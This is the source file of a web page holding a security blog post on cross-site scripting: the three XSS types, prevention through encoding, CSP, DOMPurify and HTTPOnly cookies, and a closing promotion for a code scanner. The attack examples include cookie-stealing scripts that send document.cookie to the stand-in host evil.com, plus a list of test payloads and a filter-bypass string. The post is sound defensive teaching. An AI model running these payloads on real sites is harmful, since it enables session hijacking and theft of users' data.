// app/blog/xss-attacks-explained/page.tsx
import { Header } from "@/components/layout/header"
import { Footer } from "@/components/layout/footer"
import { BackgroundGrid } from "@/components/layout/background-grid"
import Link from "next/link"
import { ArrowLeft, Calendar, Clock } from "lucide-react"

export const metadata = {
  title: "XSS Attacks Explained: How to Protect Your Web Applications",
  description: "Understanding Cross-Site Scripting (XSS) attacks and implementing effective prevention strategies to secure your web applications.",
  keywords: "xss attacks, cross-site scripting, web security, xss prevention, javascript security, dom xss",
}

export default function BlogPost() {
  return (
    <>
      <BackgroundGrid />
      <Header />
      
      <main className="container px-4 py-20 max-w-4xl">
        <Link 
          href="/blog"
          className="inline-flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground mb-8"
        >
          <ArrowLeft className="w-4 h-4" />
          Back to Blog
        </Link>

        <article className="prose prose-invert max-w-none">
          <div className="mb-8">
            <span className="text-xs font-semibold text-primary uppercase tracking-wide">
              Security
            </span>
            <h1 className="text-4xl font-bold mt-4 mb-4">
              XSS Attacks Explained: How to Protect Your Web Applications
            </h1>
            <div className="flex items-center gap-4 text-sm text-muted-foreground">
              <div className="flex items-center gap-1">
                <Calendar className="w-4 h-4" />
                March 15, 2025
              </div>
              <div className="flex items-center gap-1">
                <Clock className="w-4 h-4" />
                11 min read
              </div>
            </div>
          </div>

          <div className="space-y-6 text-muted-foreground">
            <p className="text-lg">
              Cross-Site Scripting (XSS) is one of the most common web vulnerabilities. Understanding how XSS works and how to prevent it is essential for every web developer.
            </p>

            <h2 className="text-2xl font-semibold text-foreground mt-8">What is XSS?</h2>
            <p>
              XSS occurs when an attacker injects malicious JavaScript code into a web application, which then executes in other users' browsers. This allows attackers to:
            </p>
            <ul className="list-disc pl-6 space-y-2">
              <li>Steal session cookies and tokens</li>
              <li>Capture keystrokes and form data</li>
              <li>Redirect users to malicious sites</li>
              <li>Deface websites</li>
              <li>Spread malware</li>
              <li>Perform actions on behalf of the victim</li>
            </ul>

            <h2 className="text-2xl font-semibold text-foreground mt-8">Types of XSS Attacks</h2>
            
            <h3 className="text-xl font-semibold text-foreground mt-6">1. Stored XSS (Persistent)</h3>
            <p>
              The malicious script is permanently stored on the server (database, file system, etc.) and served to users when they view the affected page.
            </p>
            <p>
              <strong>Example scenario:</strong>
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`// Attacker posts a comment with malicious script
Comment: "Great article! <script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>"

// When other users view the comment, the script executes
// Their cookies are stolen!`}</code>
            </pre>

            <h3 className="text-xl font-semibold text-foreground mt-6">2. Reflected XSS (Non-Persistent)</h3>
            <p>
              The malicious script is reflected off a web server, typically in search results or error messages.
            </p>
            <p>
              <strong>Example scenario:</strong>
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`// Vulnerable search page
https://example.com/search?q=<script>alert('XSS')</script>

// Server reflects the search term without sanitization
<p>Search results for: <script>alert('XSS')</script></p>`}</code>
            </pre>

            <h3 className="text-xl font-semibold text-foreground mt-6">3. DOM-based XSS</h3>
            <p>
              The vulnerability exists in client-side JavaScript code that improperly handles user input.
            </p>
            <p>
              <strong>Example:</strong>
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`// ❌ VULNERABLE CODE
// URL: https://example.com/#<img src=x onerror=alert('XSS')>
const userInput = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Hello ' + userInput;

// The malicious image tag executes!`}</code>
            </pre>

            <h2 className="text-2xl font-semibold text-foreground mt-8">Real-World Example: Cookie Theft</h2>
            <p>
              Here's how an attacker might steal session cookies:
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`// Attacker injects this script
<script>
  // Steal the user's session cookie
  const stolenCookie = document.cookie;
  
  // Send it to attacker's server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ cookie: stolenCookie })
  });
</script>

// Now the attacker can hijack the user's session!`}</code>
            </pre>

            <h2 className="text-2xl font-semibold text-foreground mt-8">Prevention Method 1: Output Encoding</h2>
            <p>
              Always encode user input before displaying it in HTML.
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`// ❌ VULNERABLE
element.innerHTML = userInput;

// ✅ SAFE - Use textContent
element.textContent = userInput;

// ✅ SAFE - HTML encode
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

element.innerHTML = escapeHtml(userInput);`}</code>
            </pre>

            <h2 className="text-2xl font-semibold text-foreground mt-8">Prevention Method 2: Content Security Policy (CSP)</h2>
            <p>
              CSP is a powerful defense-in-depth mechanism against XSS.
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`// Set CSP header on your server
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  object-src 'none';
  base-uri 'self';
  
// This prevents:
// - Inline scripts from executing
// - Scripts from unauthorized domains
// - eval() and similar dangerous functions`}</code>
            </pre>

            <h2 className="text-2xl font-semibold text-foreground mt-8">Prevention Method 3: Sanitization Libraries</h2>
            <p>
              Use trusted libraries to sanitize HTML when you need to display rich content.
            </p>
            <p>
              <strong>DOMPurify (Recommended):</strong>
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`import DOMPurify from 'dompurify';

// ✅ SAFE - Sanitize before inserting
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;

// DOMPurify removes dangerous elements and attributes
const dirty = '<img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
// Result: '<img src="x">'`}</code>
            </pre>

            <h2 className="text-2xl font-semibold text-foreground mt-8">Prevention Method 4: HTTPOnly Cookies</h2>
            <p>
              Prevent JavaScript from accessing session cookies.
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`// Set cookies with HTTPOnly flag
res.cookie('sessionId', sessionId, {
  httpOnly: true,      // Prevents JavaScript access
  secure: true,        // Only send over HTTPS
  sameSite: 'strict'  // Prevent CSRF
});

// Now document.cookie won't reveal the session cookie!`}</code>
            </pre>

            <h2 className="text-2xl font-semibold text-foreground mt-8">Framework-Specific Protection</h2>
            
            <p>
              <strong>React:</strong>
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`// ✅ SAFE - React automatically escapes
<div>{userInput}</div>

// ❌ DANGEROUS - Only use when necessary
<div dangerouslySetInnerHTML={{__html: userInput}} />

// ✅ SAFE - Sanitize first
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(userInput)
}} />`}</code>
            </pre>

            <p>
              <strong>Vue:</strong>
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`<!-- ✅ SAFE - Vue escapes by default -->
<div>{{ userInput }}</div>

<!-- ❌ DANGEROUS - Renders raw HTML -->
<div v-html="userInput"></div>

<!-- ✅ SAFE - Sanitize first -->
<div v-html="$sanitize(userInput)"></div>`}</code>
            </pre>

            <p>
              <strong>Angular:</strong>
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`<!-- ✅ SAFE - Angular sanitizes automatically -->
<div>{{ userInput }}</div>

<!-- ✅ SAFE - Use DomSanitizer for trusted HTML -->
import { DomSanitizer } from '@angular/platform-browser';

this.trustedHtml = this.sanitizer.sanitize(
  SecurityContext.HTML,
  userInput
);`}</code>
            </pre>

            <h2 className="text-2xl font-semibold text-foreground mt-8">Common Mistakes</h2>
            
            <p>
              <strong>1. Client-side validation only:</strong>
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`// ❌ NOT ENOUGH - Client-side can be bypassed
if (userInput.includes('<script>')) {
  alert('Invalid input');
  return;
}

// ✅ MUST validate and sanitize on server too!`}</code>
            </pre>

            <p>
              <strong>2. Incomplete sanitization:</strong>
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`// ❌ INCOMPLETE - Can be bypassed
const clean = userInput.replace(/<script>/g, '');

// Attacker uses: <scr<script>ipt>alert(1)</script>
// After removal: <script>alert(1)</script> - Still dangerous!

// ✅ Use proper sanitization libraries like DOMPurify`}</code>
            </pre>

            <p>
              <strong>3. Trusting user input in URLs:</strong>
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`// ❌ VULNERABLE
<a href="${userInput}">Click here</a>

// Attacker uses: javascript:alert(1)
// When clicked, executes JavaScript!

// ✅ SAFE - Validate URL scheme
function isSafeUrl(url) {
  return url.startsWith('http://') || url.startsWith('https://');
}

if (isSafeUrl(userInput)) {
  element.href = userInput;
}`}</code>
            </pre>

            <h2 className="text-2xl font-semibold text-foreground mt-8">Testing for XSS</h2>
            <p>
              Test your application with these payloads:
            </p>
            <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
              <code>{`<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>`}</code>
            </pre>

            <h2 className="text-2xl font-semibold text-foreground mt-8">Defense-in-Depth Strategy</h2>
            <p>
              Use multiple layers of protection:
            </p>
            <ol className="list-decimal pl-6 space-y-2">
              <li><strong>Input Validation:</strong> Validate on both client and server</li>
              <li><strong>Output Encoding:</strong> Encode all user input before display</li>
              <li><strong>CSP Headers:</strong> Implement strict Content Security Policy</li>
              <li><strong>HTTPOnly Cookies:</strong> Protect session cookies</li>
              <li><strong>Sanitization:</strong> Use DOMPurify for rich content</li>
              <li><strong>Regular Scanning:</strong> Automated security testing</li>
            </ol>

            <h2 className="text-2xl font-semibold text-foreground mt-8">XSS Security Checklist</h2>
            <ul className="list-disc pl-6 space-y-2">
              <li>✅ Never use innerHTML with user input</li>
              <li>✅ Use textContent or framework escaping</li>
              <li>✅ Implement CSP headers</li>
              <li>✅ Set HTTPOnly on session cookies</li>
              <li>✅ Sanitize rich content with DOMPurify</li>
              <li>✅ Validate URLs before href assignment</li>
              <li>✅ Don't use eval() or similar functions</li>
              <li>✅ Encode user input in different contexts (HTML, JS, URL)</li>
              <li>✅ Regular security audits and testing</li>
            </ul>

            <h2 className="text-2xl font-semibold text-foreground mt-8">Conclusion</h2>
            <p>
              XSS is preventable with proper input handling and output encoding. By following these best practices and using modern frameworks correctly, you can eliminate XSS vulnerabilities from your applications.
            </p>
            <p>
              Remember: Never trust user input, always encode output, and use defense-in-depth strategies.
            </p>

            <div className="glass-card p-6 rounded-xl mt-8">
              <h3 className="text-xl font-semibold mb-3">Detect XSS Vulnerabilities Automatically</h3>
              <p className="text-sm mb-4">
                ProbCheck scans your code for XSS vulnerabilities and provides detailed fix recommendations. Find and fix XSS before attackers exploit it.
              </p>
              <Link 
                href="/scan"
                className="inline-flex items-center gap-2 bg-primary text-primary-foreground px-4 py-2 rounded-lg font-medium hover:opacity-90 transition-opacity"
              >
                Start Free Scan →
              </Link>
            </div>
          </div>
        </article>
      </main>
      
      <Footer />
    </>
  )
}